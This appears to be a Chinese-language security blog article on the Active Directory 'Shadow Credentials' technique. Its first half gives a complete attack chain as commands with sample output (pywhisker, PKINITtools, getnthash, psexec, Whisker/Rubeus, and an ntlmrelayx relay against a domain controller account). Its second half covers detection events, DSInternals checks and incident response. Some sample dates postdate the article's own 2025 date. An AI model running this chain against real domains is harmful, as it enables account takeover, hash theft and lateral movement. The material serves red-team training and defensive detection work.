---
date: 2025-02-10T05:00:15+08:00
title: "Shadow Credentials(msDS-KeyCredentialLink)攻击与检测分析"
weight: 20
---

# Shadow Credentials(msDS-KeyCredentialLink)攻击与检测分析

`Shadow Credentials` 是 Active Directory 中极具实战价值的账户接管与持久化技术。它的核心不是修改目标用户密码，也不是直接窃取 NTLM 哈希，而是向目标对象的 `msDS-KeyCredentialLink` 属性写入攻击者控制的公钥材料，使攻击者能够通过 `PKINIT` 以目标身份向域控申请 `TGT`，随后进一步恢复票据、提取哈希或直接横向访问。

这项技术的危险性在于：

- 不依赖目标账户密码
- 密码重置后仍可能继续生效
- 对用户对象和计算机对象都可成立
- 可以由 ACL 写权限触发，也可以由 `NTLM Relay -> LDAP` 链路触发
- 在许多环境中，检测点分散在目录修改、Kerberos 预身份验证和后续访问三个平面，容易被分散漏掉

本文按“可复现、可排查、可回放”的要求编写，重点记录：

1. 攻击前提与环境边界
2. 常见利用链与请求/响应案例
3. 域控与目标主机侧日志响应
4. 蓝队狩猎、处置和 IoC 识别

---

## 0. 攻击面概览

### 0.1 这项技术真正控制的是什么

`msDS-KeyCredentialLink` 是 Active Directory 对象上的一个多值属性，用于存放 Key Credential 数据。这个机制最初是为 `Windows Hello for Business`、设备密钥信任和基于公钥的 Kerberos 预身份验证提供支撑。

攻击者一旦能够写入这个属性，就可以：

1. 生成自己的公私钥对
2. 把公钥封装成新的 Key Credential
3. 将该 Key Credential 写入目标对象
4. 使用私钥对 `PKINIT` 请求完成证明
5. 以目标对象身份向 KDC 申请 `TGT`

因此，这项攻击本质上不是“修改认证口令”，而是“向目标对象追加一套替代认证材料”。

### 0.2 与 RBCD 的区别

它和 `RBCD` 都属于“对象属性被滥用 -> 身份转换”的攻击面，但方向不同：

- `RBCD` 控制的是目标资源“允许谁代表别人访问我”
- `Shadow Credentials` 控制的是目标账户“允许哪把公钥代表我来做 PKINIT 预身份验证”

`RBCD` 的产物往往是面向某个服务的 `TGS`。
`Shadow Credentials` 的产物先是目标账户的 `TGT`，因此后续可延展空间通常更大。

### 0.3 为什么它对红队价值很高

在很多项目中，红队经常会遇到这样一种局面：

- 没有拿到密码
- 没有可爆破的服务票据
- 没有现成的 AD CS 模板滥用点
- 但手里偏偏有某个高价值对象的 `GenericWrite` 或 `WriteProperty`

传统思路下，这类权限容易被低估；但放到 `Shadow Credentials` 场景中，它可能直接等价于：

- 接管高权限用户
- 接管高权限计算机
- 建立独立于密码的持久化访问

---

## 1. 攻击前提与环境边界

### 1.1 必备条件

要让 `Shadow Credentials` 成立，通常需要同时满足下列条件：

1. 域内至少存在一台支持相关能力的域控，通常要求 `Windows Server 2016` 或更高
2. 域控具备用于 `PKINIT` 的证书与密钥材料
3. 攻击者能够修改目标对象的 `msDS-KeyCredentialLink`

第三点是决定性条件。常见来源包括：

- `GenericAll`
- `GenericWrite`
- `WriteProperty`
- 显式写入 `msDS-KeyCredentialLink`
- `Key Admins`
- `Enterprise Key Admins`
- `NTLM Relay -> LDAP` 获得的临时写入能力

### 1.2 适合攻击的目标对象

这项技术既可以打用户，也可以打计算机，但两类目标的实战意义略有不同。

用户对象常见收益：

- 直接以高权限用户身份拿到 `TGT`
- 适合做长期持久化
- 可绕开密码变更带来的访问中断

计算机对象常见收益：

- 接管高价值服务器或域控机器身份
- 适合与 `Pass-the-Cache`、`Pass-the-Certificate`、`SMB/LDAP` 访问结合
- 很适合与 `NTLM Relay` 组合

### 1.3 先确认环境有没有被合法使用过

这一点非常重要。`msDS-KeyCredentialLink` 在启用了 `WHfB`、FIDO2 或某些设备认证场景的环境中可能本来就有值。

因此，开打前应先区分：

- 这是空属性，可以直接新增
- 这是已有合法 Key Credential，需要谨慎追加
- 这是高价值生产账户，任何覆盖操作都可能影响业务

#### 请求示例

```bash
pywhisker.py -d "corp.local" -u "lowpriv" -p "Password123!" \
  --target "svc-backup" --action "list" --dc-ip 10.10.10.10
```

#### 典型响应示例

```text
[*] Searching for the target account
[*] Target user found: CN=svc-backup,CN=Users,DC=corp,DC=local
[*] Listing KeyCredentials
[*] No entries found in msDS-KeyCredentialLink
```

如果返回的是已有条目，常见会看到：

- `DeviceID`
- `Creation Time`
- `Owner`
- `Public Key` 或摘要信息

这时应在记录中明确写下：

- 当前已有几条 Key Credential
- 是用户对象还是计算机对象
- 后续打算“追加”还是“移除后再写”

### 1.4 攻击前的最小枚举集合

在动手前，建议至少完成这组最小枚举：

```powershell
Import-Module .\PowerView.ps1

# 枚举对目标对象的写权限
Get-DomainObjectAcl -ResolveGUIDs -Identity svc-backup |
  Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl"
  }

# 查看目标对象是否已有 KeyCredential
Get-ADUser svc-backup -Properties msDS-KeyCredentialLink
```

如果目标是计算机对象，则可以改成：

```powershell
Get-ADComputer DC01 -Properties msDS-KeyCredentialLink
```

---

## 2. 利用链一：ACL 写入 msDS-KeyCredentialLink

这是最标准的一条攻击链。假设当前已拿到普通账户 `lowpriv`，并发现其对目标账户 `svc-backup` 存在可写权限。

### 2.1 目标场景

场景设定如下：

- 域支持 `PKINIT`
- `lowpriv` 对 `svc-backup` 具有 `GenericWrite`
- `svc-backup` 是高价值服务账号，拥有备份、远程登录或运维权限

此时攻击链为：

1. 列出现有 `KeyCredential`
2. 追加攻击者自己的 Key Credential
3. 用对应私钥进行 `PKINIT`
4. 拿到目标 `TGT`
5. 恢复哈希或直接横向

### 2.2 第一步：确认目标对象状态

#### 请求示例

```bash
pywhisker.py -d "corp.local" -u "lowpriv" -p "Password123!" \
  --target "svc-backup" --action "list" --dc-ip 10.10.10.10
```

#### 典型响应示例

```text
[*] LDAP bind OK
[*] Searching for the target account
[*] Found DN: CN=svc-backup,CN=Users,DC=corp,DC=local
[*] KeyCredential count: 0
```

这里记录的关键不是“工具跑通了”，而是：

- 目标 DN
- 当前 KeyCredential 数量
- 目标对象类型

如果这里已经有值，建议在记录里同时保存原始状态，避免后续只看“被加了恶意值”，却说不清楚环境原本合法条目长什么样。

### 2.3 第二步：写入 Shadow Credential

常见 Linux 路线使用 `pyWhisker`。它会在本地生成密钥材料，并把新的 Key Credential 写入目标对象的 `msDS-KeyCredentialLink`。

#### 请求示例

```bash
pywhisker.py -d "corp.local" -u "lowpriv" -p "Password123!" \
  --target "svc-backup" --action "add" \
  --filename "svc-backup-shadow" --export PEM --dc-ip 10.10.10.10
```

#### 典型响应示例

```text
[*] LDAP bind OK
[*] Searching for the target account
[*] Found DN: CN=svc-backup,CN=Users,DC=corp,DC=local
[*] Generating RSA key pair
[*] Building KeyCredential structure
[*] Updating msDS-KeyCredentialLink
[+] KeyCredential added successfully
[+] PEM certificate saved to svc-backup-shadow_cert.pem
[+] PEM private key saved to svc-backup-shadow_priv.pem
[+] DeviceID: 1e92c7a8-8b0b-4c37-9d9d-7d1bca6a4d0b
```

应记录的关键字段包括：

- 目标对象 DN
- 写入动作是否成功
- 输出的证书/私钥文件名
- `DeviceID`

这一步的本质请求其实是：

- LDAP 写请求：向 `msDS-KeyCredentialLink` 追加一个新的 Key Credential Blob

工具只是把底层二进制构造和 LDAP 修改封装掉了。

### 2.4 第三步：验证写入结果

#### 请求示例

```bash
pywhisker.py -d "corp.local" -u "lowpriv" -p "Password123!" \
  --target "svc-backup" --action "list" --dc-ip 10.10.10.10
```

#### 典型响应示例

```text
[*] Listing KeyCredentials for svc-backup
  DeviceID: 1e92c7a8-8b0b-4c37-9d9d-7d1bca6a4d0b
  Creation Time: 2026-06-12 20:13:22
  Owner: CN=svc-backup,CN=Users,DC=corp,DC=local
```

如果你要做攻防回放，这一步非常重要，因为它是“对象已被植入替代认证材料”的直接证明。

### 2.5 第四步：使用 PKINIT 申请 TGT

写入 `KeyCredential` 后，攻击者就可以用自己控制的私钥对 KDC 发起 `PKINIT` 预身份验证，代表目标对象申请 `TGT`。

常见 Linux 路线会用 `PKINITtools`。

#### 请求示例

```bash
gettgtpkinit.py corp.local/svc-backup \
  -cert-pem svc-backup-shadow_cert.pem \
  -key-pem svc-backup-shadow_priv.pem \
  svc-backup.ccache
```

#### 典型响应示例

```text
[*] Using principal: svc-backup@corp.local
[*] Trying to get TGT via PKINIT
[*] AS-REQ sent successfully
[*] AS-REP received
[+] TGT stored in svc-backup.ccache
[+] AS-REP encryption key: 4f8a6d8d4d2f...
```

这里对应的协议动作是：

- 请求：`AS-REQ`，使用公钥/证书完成 `PKINIT`
- 响应：`AS-REP`，返回 `TGT`

应重点记录：

- 目标主体是谁
- `TGT` 被保存到哪里
- 返回的会话密钥或 `AS-REP key`

### 2.6 第五步：恢复哈希或继续横向

拿到 `TGT` 后，常见的下一步不是立即结束，而是继续恢复目标对象的哈希，或直接使用票据访问服务。

#### 请求示例：恢复哈希

```bash
getnthash.py corp.local/svc-backup -key 4f8a6d8d4d2f... 
```

#### 典型响应示例

```text
[*] Using TGT from cache
[*] Requesting PAC
[+] NT hash for svc-backup: 8846f7eaee8fb117ad06bdd830b7586c
```

注意：不同工具链对参数形式和恢复方式有差异。有的依赖 `AS-REP key`，有的由 `Certipy` 直接整合完成。

#### 请求示例：使用票据横向

```bash
export KRB5CCNAME=svc-backup.ccache
impacket-psexec -k -no-pass corp.local/svc-backup@fileserver.corp.local
```

#### 典型响应示例

```text
[*] Requesting shares on fileserver.corp.local.....
[*] Found writable share ADMIN$
[*] Opening SVCManager on fileserver.corp.local.....
[*] Creating service ...
[*] Starting service ...
```

这说明：

- 目标服务接受了当前票据
- 被接管账户确实对目标主机具备足够权限

---

## 3. 利用链二：Whisker + Rubeus 的 Windows 路线

如果攻击者已经拿到域内 Windows 主机落点，且更倾向于使用原生 C# 工具链，常见做法是 `Whisker + Rubeus`。

### 3.1 添加 Shadow Credential

#### 请求示例

```powershell
Whisker.exe add /target:svc-backup /domain:corp.local /dc:dc01.corp.local
```

#### 典型响应示例

```text
[*] Searching for the target account
[*] Generating certificate
[*] Updating msDS-KeyCredentialLink
[+] KeyCredential added successfully!
[+] DeviceID: 97c22d9a-6c95-4f7d-9c4d-2d1db0ec0d62
[+] Certificate: MII...
[+] Rubeus command:
    Rubeus.exe asktgt /user:svc-backup /certificate:MII... /ptt
```

Whisker 的优势在于：

- 一次性把写入动作和后续认证命令都生成出来
- 适合 Beacon/Assembly 执行环境

### 3.2 使用 Rubeus 请求 TGT

#### 请求示例

```powershell
Rubeus.exe asktgt /user:svc-backup /certificate:MII... /ptt
```

#### 典型响应示例

```text
[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac
[+] TGT request successful!
[+] base64(ticket.kirbi):
      doIF...
[+] Ticket injected into current session
```

这里最关键的响应信息是：

- `TGT request successful`
- 票据是否已注入当前会话

如果文章或报告只写“执行 Rubeus 成功”，而不记录这些输出，那么后续既无法复盘，也不利于蓝队理解真正成功点。

---

## 4. 利用链三：NTLM Relay 直接写入 Shadow Credentials

`Shadow Credentials` 和 `RBCD` 一样，也可以和 `LDAP Relay` 结合。区别在于这里改的不是 `msDS-AllowedToActOnBehalfOfOtherIdentity`，而是 `msDS-KeyCredentialLink`。

### 4.1 攻击逻辑

这条链的核心是：

1. 诱导目标主机或目标账户发起 NTLM 认证
2. 中继到域控的 `LDAP/LDAPS`
3. 直接修改目标对象的 `msDS-KeyCredentialLink`
4. 保存攻击者控制的私钥与证书
5. 使用 `PKINIT` 请求目标对象的 `TGT`

它的优势在于：

- 不需要先有原生 ACL 写权限
- 不需要创建新机器账户
- 非常适合打计算机对象

### 4.2 Relay 请求与响应案例

#### 请求示例

```bash
ntlmrelayx.py -t ldaps://10.10.10.10 \
  -smb2support \
  --shadow-credentials \
  --shadow-target 'DC01$' \
  --no-validate-privs --no-dump --no-da --no-acl
```

#### 典型响应示例

```text
[*] HTTPD: Connection from 10.10.10.21 controlled, attacking target ldaps://10.10.10.10
[*] Authenticating against ldaps://10.10.10.10 as CORP/DC01$ SUCCEED
[*] Updating the msDS-KeyCredentialLink attribute of DC01$
[+] Shadow credentials added successfully
[+] Saved certificate and private key to disk
```

应记录的关键字段：

- 来源连接 IP
- 被中继成功的主体
- 被写入的目标对象
- 是否成功保存证书与私钥

### 4.3 后续 PKINIT 请求

#### 请求示例

```bash
gettgtpkinit.py corp.local/DC01\$ \
  -cert-pem dc01_cert.pem \
  -key-pem dc01_priv.pem \
  dc01.ccache
```

#### 典型响应示例

```text
[*] Using principal: DC01$@corp.local
[*] Trying to get TGT via PKINIT
[+] TGT stored in dc01.ccache
```

如果这一步成功，就意味着：

- 目标计算机对象已经被持久化接管
- 后续可以以该计算机身份进行 `LDAP`、`SMB` 或更多机器级操作

---

## 5. 这项技术最容易失败的地方

不要把 `Shadow Credentials` 理解成“只要写了属性就稳赢”。实战里常见失败点包括：

- 域控不支持或未正确启用 `PKINIT`
- 目标对象虽然可写，但 `msDS-KeyCredentialLink` 已有复杂合法值
- 工具生成的 Key Credential 与环境兼容性有问题
- 使用了错误的主体名、证书格式或访问方式
- 后续拿到 `TGT` 后，目标身份其实没有你想象的权限

其中一个非常实战的问题是：

- 写入成功了
- `TGT` 也拿到了
- 但攻击者并没有立刻验证目标身份究竟能访问什么

因此建议在文章或项目记录里把“请求 -> 响应 -> 成功判据”写清楚，不要只写攻击动作。

---

## 6. 蓝队检测：从属性写入到 PKINIT 认证

`Shadow Credentials` 的检测不能只盯 `LDAP` 写入，也不能只盯 `Kerberos`。必须把两类行为串起来。

### 6.1 Event ID 5136：msDS-KeyCredentialLink 被修改

这是最核心的目录修改事件。

#### 事件示例

```text
Event ID: 5136
SubjectUserName: lowpriv
ObjectDN: CN=svc-backup,CN=Users,DC=corp,DC=local
AttributeLDAPDisplayName: msDS-KeyCredentialLink
OperationType: Value Added
```

应重点观察：

- 谁修改了这个属性
- 修改目标是用户还是计算机
- 是追加还是替换
- 该对象是否属于高价值账户

需要注意的是：用户对象与计算机对象的默认审计表现可能不同。很多环境里只有在正确设置了 SACL 后，用户对象的 `msDS-KeyCredentialLink` 变化才会稳定产生日志。

### 6.2 Event ID 4768：PKINIT 异常 TGT 请求

当攻击者开始使用写入的 Key Credential 做 `PKINIT` 时，域控会产生 `4768`。

#### 事件示例

```text
Event ID: 4768
TargetUserName: svc-backup
IpAddress: 10.10.10.21
PreAuthType: PKINIT-related
```

这里有个很实际的细节：不同日志解析器、Windows 版本和 SIEM 规则，对 `Pre-Auth Type` 的展示可能并不完全一致。有的资料会提到 `15/16`，有的会提到 `17/18`，因此蓝队不要机械依赖单一数值，应该更关注：

- 这是证书/公钥相关的 Kerberos 预身份验证
- 这个账户平时是否根本不用 `PKINIT`
- 请求来源 IP 是否异常

### 6.3 5136 与 4768 的时间窗关联

在大多数真实攻击中，最有价值的关联规则不是单独某条事件，而是：

1. `5136`：某对象的 `msDS-KeyCredentialLink` 被改
2. 随后不久出现 `4768`
3. 请求主体正是刚被修改的对象
4. 来源主机不是该对象平时的认证来源

这条时间链的攻击含义非常明确：

- 属性被种入了替代认证材料
- 很快就有人拿这套材料去做了实际认证

### 6.4 目标主机侧的响应日志

如果攻击者随后拿到目标身份去访问高价值主机，常见还会看到：

- `4624`：网络登录
- `5140`：共享访问
- `7045`：服务安装
- `4698`：计划任务创建

#### 响应示例

```text
Event ID: 4624
LogonType: 3
AuthenticationPackage: Kerberos
TargetUserName: svc-backup
WorkstationName: ATTACKBOX
```

这说明这次身份接管不再只是目录层面，而是已经转化成实际横向访问。

---

## 7. 更细的检测：识别恶意 KeyCredential 结构

这部分是蓝队很容易忽视、但非常有价值的高级检测点。

DSInternals 作者 Michael Grafnetter 在 2025/2026 年的公开研究中指出，一些开源工具链，尤其某些 `Impacket` 版本在写入 `msDS-KeyCredentialLink` 时，会生成存在明显结构缺陷的 `NGC` 数据。可见特征包括：

- `KeyHash` 计算不规范
- `KeyCreationTime` 时间异常
- 计算机对象带有不合理的 `DeviceId`

这意味着蓝队不只可以查“这个属性有没有被改”，还可以查：

- 改进去的数据结构本身是不是像恶意工具写出来的

### 7.1 DSInternals 检查示例

#### 请求示例

```powershell
Get-ADObject -LDAPFilter '(msDS-KeyCredentialLink=*)' -Properties msDS-KeyCredentialLink |
  Select-Object -ExpandProperty msDS-KeyCredentialLink |
  Get-ADKeyCredential |
  Where-Object Usage -eq NGC
```

#### 典型响应示例

```text
Usage Source Flags DeviceId Created Owner
----- ------ ----- -------- ------- -----
NGC   AD     None  ff53f58e-81a9-5d40-96bb-4980c91008ae 3625-02-23 CN=PC04,CN=Computers,DC=corp,DC=local
NGC   AD     None  e49d674f-0259-44f3-a3bd-8343b76046fc 2026-06-12 CN=svc-backup,CN=Users,DC=corp,DC=local
```

如果你看到明显不合理的创建时间，比如远超当前年份，或计算机对象上出现不合理的随机 `DeviceId`，这就非常接近高价值 IoC。

### 7.2 合法与异常的边界

合法 `WHfB` / 设备密钥场景通常有较稳定特征：

- 来源设备可解释
- 创建时间合理
- `DeviceId` 与真实设备对象存在对应关系
- 相关账户平时就使用基于公钥的认证

而恶意 Shadow Credential 常见异常点包括：

- 写入者与目标对象无业务关系
- 目标是高价值账户或高价值计算机
- 认证来源为攻击机、跳板机或异常主机
- KeyCredential 结构存在工具特征

---

## 8. 调查与处置

### 8.1 第一阶段：确认是不是单纯误报

先回答三个问题：

1. 该对象原本是否存在合法 `msDS-KeyCredentialLink`
2. 写入者是否属于正常设备注册、WHfB 管理或身份平台流程
3. 该对象平时是否真的会使用 `PKINIT`

### 8.2 第二阶段：确认是否已被实际使用

不要只停在 `5136`。继续关联：

- 后续 `4768`
- 来源 IP
- 目标主机访问日志
- 是否已出现 `psexec`、`SMB`、`LDAP` 高权限动作

### 8.3 立即处置动作

一旦确认被利用，建议至少执行：

- 清理恶意 `msDS-KeyCredentialLink` 条目
- 检查目标对象是否还有其他合法 KeyCredential，避免误删
- 重置目标对象密码或密钥材料
- 检查是否已有票据被实际用于横向

如果目标是高价值服务账号或域控机器账户，还应进一步评估：

- 是否已发生凭据导出
- 是否已形成二次持久化
- 是否需要扩大到域级应急范围

### 8.4 长期加固

长期建议包括：

- 清理对高价值对象的 `GenericWrite/GenericAll/WriteProperty`
- 限制 `Key Admins` / `Enterprise Key Admins`
- 为用户和计算机对象配置合适的 SACL，确保 `msDS-KeyCredentialLink` 修改可见
- 对非常用 `PKINIT` 环境建立异常检测
- 对 KeyCredential 结构异常建立周期性检查

---

## 9. 复盘清单

### 9.1 红队侧

- 当前是否具备目标对象的 `msDS-KeyCredentialLink` 写权限
- 目标对象是否比 `RBCD` 更适合直接做 Shadow Credential takeover
- 域控是否支持 `PKINIT`
- 目标对象原本是否已有合法 KeyCredential
- 后续准备怎么把 `TGT` 转成真正的横向收益

### 9.2 蓝队侧

- 是否已稳定采集 `5136` 与 `4768`
- 是否能关联对象写入与后续 PKINIT 请求
- 是否能区分合法设备注册与恶意公钥注入
- 是否已经具备 DSInternals 或等价结构检查能力
- 是否能把目标主机侧行为纳入同一时间线

### 9.3 应急侧

- 删除的是不是恶意条目而不是全部条目
- 目标账户是否已经被继续横向利用
- 是否需要重置对象密码、重新入域或调整证书/设备信任关系
- 是否需要回溯是 ACL 写入还是中继链导致

---

## 10. 总结

`Shadow Credentials` 的危险不在于“又一个 AD 技术名词”，而在于它把一个常见但长期被低估的事实变成了可操作攻击链：

- 只要能写 `msDS-KeyCredentialLink`
- 就可能不碰密码地接管对象
- 并通过 `PKINIT` 获取正式的 Kerberos 身份

对红队来说，它是高价值对象 takeover 与持久化的优先选项之一。
对蓝队来说，真正关键的不是只记住 `msDS-KeyCredentialLink` 这个名字，而是能否把下面几类响应串起来：

- 写属性的 LDAP 响应
- `5136`
- `4768`
- 目标主机侧的实际访问响应

只有把“属性写入 -> 公钥认证 -> 票据使用”连成一条线，才能真正看清 Shadow Credentials 的攻击面。

---

## 参考资料

- [SpecterOps: Shadow Credentials - Abusing Key Trust Account Mapping for Takeover](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [The Hacker Recipes: Shadow Credentials](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
- [iRed.Team: Shadow Credentials](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials)
- [PentestLab: Shadow Credentials](https://pentestlab.blog/2022/02/07/shadow-credentials/)
- [BloodHound: AddKeyCredentialLink](https://bloodhound.specterops.io/resources/edges/add-key-credential-link)
- [DSInternals: Indicator of Compromise - NTLM Relay Attack with Shadow Credentials](https://www.dsinternals.com/en/indicator-of-compromise-shadow-credentials-ntlm-relay-impacket/)
- [cyberstoph: Detecting shadow credentials](https://cyberstoph.org/posts/2022/03/detecting-shadow-credentials/)
- [GuidePoint: Beyond the Basics - Uncommon NTLM Relay Techniques](https://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/)
- [Hive Security: Shadow Credentials - Account Takeover Without a Password](https://hivesecurity.gitlab.io/blog/shadow-credentials-attack-ad-takeover/)
